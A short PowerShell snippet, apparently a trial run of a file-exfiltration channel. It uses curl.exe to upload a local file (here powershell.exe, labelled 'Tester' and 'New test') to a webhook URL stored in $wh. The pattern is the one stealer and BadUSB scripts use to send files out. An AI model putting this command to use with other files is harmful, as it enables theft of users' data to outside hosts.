Start-Process c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe

curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"New test\`"}" -F "file=@\`"c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe`"" $wh
